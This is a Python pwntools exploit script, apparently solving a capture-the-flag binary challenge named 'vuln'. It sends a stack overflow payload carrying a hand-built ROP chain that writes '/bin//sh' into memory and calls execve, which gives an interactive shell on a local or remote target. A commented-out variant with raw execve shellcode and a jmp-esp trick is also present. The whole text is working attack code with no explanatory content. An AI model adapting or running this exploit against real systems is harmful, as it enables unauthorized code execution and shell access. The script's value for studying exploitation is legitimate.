from pwn import (
    args,
    gdb,
    remote,
    process,
    flat,
    asm,
    p32,
    ELF,
    context,
    sys,
    warnings,
)
from struct import pack


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


warnings.filterwarnings("ignore")
gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./vuln"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context.terminal = "kitty"

io = start()

offset = 28
jmp_esp = asm("jmp esp")
shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"


# Padding goes here
p = b""

p += pack("<I", 0x080583B9)  # pop edx ; pop ebx ; ret
p += pack("<I", 0x080E5060)  # @ .data
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x080B073A)  # pop eax ; ret
p += b"/bin"
p += pack("<I", 0x080590F2)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x080583B9)  # pop edx ; pop ebx ; ret
p += pack("<I", 0x080E5064)  # @ .data + 4
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x080B073A)  # pop eax ; ret
p += b"//sh"
p += pack("<I", 0x080590F2)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x080583B9)  # pop edx ; pop ebx ; ret
p += pack("<I", 0x080E5068)  # @ .data + 8
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x0804FB80)  # xor eax, eax ; ret
p += pack("<I", 0x080590F2)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x08049022)  # pop ebx ; ret
p += pack("<I", 0x080E5060)  # @ .data
p += pack("<I", 0x08049E29)  # pop ecx ; ret
p += pack("<I", 0x080E5068)  # @ .data + 8
p += pack("<I", 0x080583B9)  # pop edx ; pop ebx ; ret
p += pack("<I", 0x080E5068)  # @ .data + 8
p += pack("<I", 0x080E5060)  # padding without overwrite ebx
p += pack("<I", 0x0804FB80)  # xor eax, eax ; ret
for i in range(11):  # 11 for execve syscall
    p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0804A3C2)  # int 0x80

jmp_eax = 0x0805333B

# Shellcode
# payload = jmp_esp.ljust(offset, b"\x90")
# payload += p32(jmp_eax)
# payload += shellcode

# Ret2syscall
payload = flat({offset: p})

io.sendline(payload)

io.interactive()
